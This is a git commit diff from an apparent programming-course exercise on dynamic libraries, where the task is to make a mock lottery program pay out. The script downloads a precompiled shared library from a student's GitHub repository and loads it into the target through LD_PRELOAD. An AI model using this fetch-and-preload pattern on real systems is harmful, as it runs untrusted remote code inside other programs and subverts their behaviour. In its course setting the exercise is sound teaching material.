b06373354b6df8cc0fd382c4838029549593ea08
HillaArts <hassenyehillary@gmail.com>
2023-11-14 09:46:22 -0800

    I bought a ticket for the Giga Millions and chose these numbers: 9, 8, 10, 24, 75 + 9. If you could run two commands on the same server where the Giga Millions program runs, could you make me win the Jackpot?

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/kemboi-73/alx-low_level_programming/raw/master/0x18-dynamic_libraries/gm_crack.so
-export LD_PRELOAD=/tmp/gm_crack.so
+wget -q -O $PWD/libfile.so https://github.com/catherinekimani/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libfile.so
+export LD_PRELOAD=$PWD/libfile.so
